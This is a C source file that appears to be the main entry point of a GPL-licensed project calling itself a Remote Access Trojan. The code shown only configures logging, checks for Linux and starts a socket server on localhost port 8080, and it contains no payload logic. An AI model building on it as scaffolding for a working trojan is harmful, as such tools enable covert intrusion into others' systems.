/*
 *  Luther Blissett  --  Remote Access Trojan
 *  Copyright (C) 2024  Davide Usberti aka UsboKirishima
 *
 *  Luther Blissett is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  Luther Blissett is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with Luther Blissett.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/mount.h>
#include <signal.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <time.h>
#include <unistd.h>
#include <stddef.h>
#include <stdalign.h>
#include <regex.h>
#include <stdbool.h>
#include <sys/socket.h>
#include <sys/utsname.h>
#include <sys/sysinfo.h>
#include <sys/statvfs.h>
#include <sys/mount.h>
#include <linux/loop.h>
#include <fcntl.h>
#include <netinet/in.h>

#include <errors/errors.h> //Logger messages
#include <logs/slog.c>     //Logger library
#include <server/server.h> //Socket server

#define DEV true
#define LINUX true
#define NAME "LB "
#define LOGS_MODE false
#undef MIN
#define MIN(x, y) ((x) < (y) ? (x) : (y))
#undef MAX
#define MAX(x, y) ((x) > (y) ? (x) : (y))
#define ISODD(x) ((x) & 1)
#define ISBLANK(x) ((x) == ' ' || (x) == '\t')
#define TOUPPER(ch) (((ch) >= 'a' && (ch) <= 'z') ? ((ch) - 'a' + 'A') : (ch))
#define TOLOWER(ch) (((ch) >= 'A' && (ch) <= 'Z') ? ((ch) - 'A' + 'a') : (ch))
#define ISUPPER_(ch) ((ch) >= 'A' && (ch) <= 'Z')
#define ISLOWER_(ch) ((ch) >= 'a' && (ch) <= 'z')
#define ALIGN_UP(x, A) ((((x) + (A) - 1) / (A)) * (A))
#define CONCAT(x, y) (strcat(x, y))
#define READLINE_MAX 256
#define FILTER '/'
#define RFILTER '\\'
#define CASE ':'
#define MSGWAIT '$'
#define SELECT ' '
#define PREFIX '--'
#define PORT 8080

#ifdef _WIN32
#define OS -1
#elif _WIN64
#define OS -1
#elif __APPLE__
#define OS -1
#elif __linux__
#define OS 0
#endif

void checkOS(short os_type)
{
    if (OS != 0)
    {
        slog_display(SLOG_ERROR, 1, ERROR_INVALID_OS);
        exit(EXIT_FAILURE);
    }
}

int main(int argc,
         char **argv)
{
    slog_config_t cfg;
    slog_config_get(&cfg);
    cfg.eDateControl = SLOG_DATE_FULL;
    slog_config_set(&cfg);
    slog_init("Luther Blissett", SLOG_FLAGS_ALL, 0);
    slog_config_get(&cfg);

    slog_display(SLOG_NOTE, 1, NOTE_STARTED_SUCCESS);

    /**
     * Operating System (Linux Only)
     */
    checkOS(OS);

    /**
     * Socket Server
    */
    lb_server("127.0.0.1", PORT);

    return 0;
}